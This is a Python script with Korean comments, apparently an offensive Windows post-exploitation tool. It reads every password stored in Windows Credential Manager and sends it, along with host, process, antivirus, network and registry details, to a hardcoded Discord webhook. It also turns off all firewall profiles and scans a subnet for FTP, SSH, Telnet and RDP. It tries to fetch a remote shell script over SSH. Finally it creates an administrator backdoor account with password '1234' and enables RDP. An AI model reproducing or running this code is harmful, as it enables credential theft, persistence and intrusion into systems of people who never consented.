import requests
import socket
import os
import subprocess
import ctypes
from ctypes import windll
from ctypes import wintypes
from collections import namedtuple
import ipaddress
import paramiko
import random
import string

# 인코딩 설정
# previousCp = windll.kernel32.GetConsoleOutputCP()
# cp = windll.kernel32.GetConsoleOutputCP()
cp = 65001

# 디스코드 전달
def send_to_discord(content):
    try:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
        headers = {
            "Content-Type": "application/json"
        }

        for i in content.split("\n"):
            data = {
                "content": i
            }
            r = requests.post(webhook_url, json=data, headers=headers)
    except Exception as e:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
        
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "content": "SEND Error!\n" + str(e)
        }
        r = requests.post(webhook_url, json=data, headers=headers)

# 자격증명관리자 정보 모두 출력
class FILETIME(ctypes.Structure):
    """
    Defines the layout for the WINAPI FILETIME struct.
    https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-filetime
    """
    _fields_ = [
        ("dwLowDateTime", ctypes.c_int),
        ("dwHighDateTime", ctypes.c_int),
    ]


class CREDENTIAL_ATTRIBUTEW(ctypes.Structure):
    """
    Defines the layout for the WINAPI CREDENTIAL_ATTRIBUTEW struct.
    See https://docs.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credential_attributew.
    """
    _fields_ = [
        ("Keyword", wintypes.LPWSTR),
        ("Flags", wintypes.DWORD),
        ("ValueSize", wintypes.DWORD),
        ("Value", wintypes.LPBYTE)
    ]


class CREDENTIALW(ctypes.Structure):
    """
    Defines the layout for the WINAPI CREDENTIALW struct.
    https://docs.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credentialw
    """
    _fields_ = [
        ("Flags", wintypes.DWORD),
        ("Type", wintypes.DWORD),
        ("TargetName", wintypes.LPWSTR),
        ("Comment", wintypes.LPWSTR),
        ("LastWritten", FILETIME),
        ("CredentialBlobSize", wintypes.DWORD),
        ("CredentialBlob", wintypes.LPBYTE),
        ("Persist", wintypes.DWORD),
        ("AttributeCount", wintypes.DWORD),
        ("Attributes", ctypes.POINTER(CREDENTIAL_ATTRIBUTEW)),
        ("TargetAlias", wintypes.LPWSTR),
        ("UserName", wintypes.LPWSTR),
    ]


class Cred(namedtuple('Cred', ['target_name', 'username', 'password'])):
    """
    A namedtuple that provides easy access to the relevant fields in WinAPI C CREDENTIALW objects
    as Python strings.
    """
    @staticmethod
    def from_winapi_credential(pcred):
        """
        Convert a pointer to a WinAPI C CREDENTIALW object into a Cred object
        """
        pass_len = pcred.contents.CredentialBlobSize
        pass_buffer = ctypes.create_unicode_buffer(pass_len + 1)  # +1 for terminating null
        ctypes.memmove(pass_buffer, pcred.contents.CredentialBlob, pass_len)
        return Cred(pcred.contents.TargetName, pcred.contents.UserName, pass_buffer.value)

# prepare used WinAPI functions
advapi32 = ctypes.windll.advapi32
advapi32.CredReadW.restype = wintypes.BOOL
advapi32.CredReadW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                               ctypes.POINTER(ctypes.POINTER(CREDENTIALW))]

advapi32.CredEnumerateW.restype = wintypes.BOOL
advapi32.CredEnumerateW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD),
                                    ctypes.POINTER(ctypes.POINTER(ctypes.POINTER(CREDENTIALW)))]
kernel32 = ctypes.windll.kernel32
kernel32.GetLastError.restype = wintypes.DWORD

def get_cred_by_target_name(target_name):
    """
    Returns the stored credentials for the given target_name as a Cred object
    """
    pcred = ctypes.POINTER(CREDENTIALW)()
    ok = advapi32.CredReadW(target_name, 1, 0, ctypes.byref(pcred))
    if not ok:
        error = kernel32.GetLastError()
        raise RuntimeError(error)
    cred = Cred.from_winapi_credential(pcred)
    advapi32.CredFree(pcred)
    return cred


def get_all_creds():
    """
    Returns all credentials stored in the credential manager as a list of Cred objects
    """
    count = wintypes.DWORD()
    pcred = ctypes.POINTER(ctypes.POINTER(CREDENTIALW))()
    ok = advapi32.CredEnumerateW(None, 1, ctypes.byref(count), ctypes.byref(pcred))
    if not ok:
        error = kernel32.GetLastError()
        raise RuntimeError(error)
    creds = [Cred.from_winapi_credential(pcred[i]) for i in range(count.value)]
    advapi32.CredFree(pcred)
    return creds

# 방화벽 관련
def get_firewall():
    command = """
    Import-Module NetSecurity
    Get-NetFirewallProfile
    """

    process = subprocess.Popen(
        ['powershell', '-Command', command],
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        encoding='cp' + str(cp)
    )

    # 출력과 오류를 읽음
    stdout, stderr = process.communicate()

    if stderr:
        send_to_discord(f"Error: {stderr}")
    else:
        send_to_discord(stdout)
    
    
def disable_firewall():
    # PowerShell 명령어: 방화벽 끄기
    command = 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
    
    # PowerShell을 통해 명령어 실행
    process = subprocess.Popen(
        ['powershell', '-Command', command],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding='cp' + str(cp)
    )

    # 출력과 오류를 읽음
    stdout, stderr = process.communicate()

    # 오류가 있으면 출력하고, 없으면 성공 메시지 출력
    if stderr:
        send_to_discord(f"Firewall disable Error: {stderr}")
    else:
        send_to_discord("Firewall has been disabled successfully.")
        send_to_discord(stdout)

def start_command(command):
    process = subprocess.Popen(
        ['powershell', '-Command', command],
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        encoding='cp' + str(cp),
        shell=True
    )

    stdout, stderr = process.communicate()

    if stderr:
        send_to_discord(f"Error: {stderr}")
    else:
        send_to_discord(stdout)

def get_ipconfig():
    process = subprocess.Popen(
        ['powershell', '-Command', 'ipconfig'],
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        encoding='cp1252',
        shell=True
    )

    stdout, stderr = process.communicate()
    if stderr:
        send_to_discord(f"Error: {stderr}")
    else:
        send_to_discord(stdout)

# 스캔 
def check_port(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        return result == 0

def ssh_connect(ip):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        send_to_discord(f"Successfully connected to {ip}")
        
        stdin, stdout, stderr = client.exec_command('pwd')
        output = stdout.read().decode().strip()
        send_to_discord(f"현재 작업 디렉토리: {output}")
        
        file_url = "https://raw.githubusercontent.com/seo-hyeon/Mecro_Test/refs/heads/main/mecro.sh"
        command = f"curl -L {file_url} -o {output}/test.sh"
        stdin, stdout, stderr = client.exec_command(command)
        send_to_discord(stdout.read().decode().strip())
        send_to_discord(stderr.read().decode().strip())

        client.close()
        return True
    except Exception as e:
        send_to_discord(f"Failed to connect to {ip}: {e}")
        return False

if __name__ == "__main__":
    # 기본 정보 출력
    hostname = socket.gethostname()
    fqdn = socket.getfqdn()
    current_user = os.getlogin()

    send_to_discord(f"HostName: {hostname}")
    send_to_discord(f"FQDN: {fqdn}")
    send_to_discord(f"User: {current_user}")

    # 자격증명 획득
    send_to_discord("######### Credential Manager #########")
    send_to_discord("\n".join(map(str, get_all_creds())))
    send_to_discord(" . ")

    # 방화벽 출력 및 전체 끄기
    send_to_discord("######### Firewall #########")
    get_firewall()
    disable_firewall()
    send_to_discord(" . ")

    # 기타 정보 출력
    ## 실행 중인 프로세스 출력
    send_to_discord("######### TaskList #########")
    start_command("tasklist")
    send_to_discord(" . ")

    ## 백신 관련 프로세스 출력
    send_to_discord("######### Process List #########")
    start_command("Get-WmiObject -Query \"SELECT * FROM Win32_Process WHERE Name='msmpeng.exe' OR Name='avp.exe' OR Name='mcshield.exe' OR Name='Symantec*'\"")
    send_to_discord(" . ")

    ## ipconfig 출력
    send_to_discord("######### IPCONFIG #########")
    get_ipconfig()
    send_to_discord(" . ")

    ## netstat 출력
    send_to_discord("######### NETSTAT #########")
    start_command("netstat -rn")
    send_to_discord(" . ")

    ## 레지스트리에 저장된 정보
    ### 시작 프로그램 목록
    send_to_discord("######### 시작 프로그램 목록 #########")
    start_command('Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"')
    send_to_discord(" . ")

    ### 시스템 설정
    # send_to_discord("######### 시스템 설정 #########")
    start_command('Get-ChildItem -Path "HKLM:\System\CurrentControlSet\Services"')
    send_to_discord(" . ")

    ### 윈도우 업데이트
    send_to_discord("######### Windows 업데이트 #########")
    start_command('Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate"')
    send_to_discord(" . ")

    ### Windows 설치 정보
    send_to_discord("######### Windows 버전 #########")
    start_command('Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion"')
    send_to_discord(" . ")

    # 스캔 + 접속 시도 -> 제대로 스캔이 되지 않음.
    private_ips = [
        ipaddress.IPv4Network('172.20.21.0/25')
    ]

    ftp = []
    ssh = []
    telnet = []

    i = 0
    send_to_discord("######### SCAN Start #########")
    for network in private_ips:
        for ip in network.hosts():
            ip_str = str(ip)
            if i % 10 == 0:
                send_to_discord(ip_str)
            i += 1

            if check_port(ip_str, 21):
                ftp.append(ip_str)
            if check_port(ip_str, 22):
                ssh.append(ip_str)
            if check_port(ip_str, 23):
                telnet.append(ip_str)
            if check_port(ip_str, 3389):
                telnet.append(ip_str)

    send_to_discord("######### FTP #########")
    send_to_discord(', '.join(ftp))
    send_to_discord(" . ")
    send_to_discord("######### SSH #########")
    send_to_discord(', '.join(ssh))
    send_to_discord(" . ")
    send_to_discord("######### TELNET #########")
    send_to_discord(', '.join(telnet))
    send_to_discord(" . ")

    # 유저 생성 및 RDP 오픈
    send_to_discord("######### User #########")
    start_command("Get-LocalUser")
    send_to_discord(" . ")

    send_to_discord("######### Create User #########")
    username = ''.join(random.choices(string.ascii_lowercase, k=4))
    send_to_discord(f"* UserName: {username}")
    start_command(f'New-LocalUser "{username}" -Password (ConvertTo-SecureString "1234" -AsPlainText -Force) -FullName "{username}" -Description "{username}"')
    start_command(f'Add-LocalGroupMember -Group "Administrators" -Member "{username}"')
    start_command(f"Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0")
    start_command(f'New-NetFirewallRule -Name "Allow RDP" -DisplayName "Allow RDP" -Enabled True -Protocol TCP -Action Allow -LocalPort 3389')
    start_command(f'Add-LocalGroupMember -Group "Remote Desktop Users" -Member "{username}"')
    send_to_discord("######### RDP 오픈 시도 결과 #########")
    start_command(f'Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections')
    send_to_discord(" . ")

    send_to_discord("######### 끝! #########")








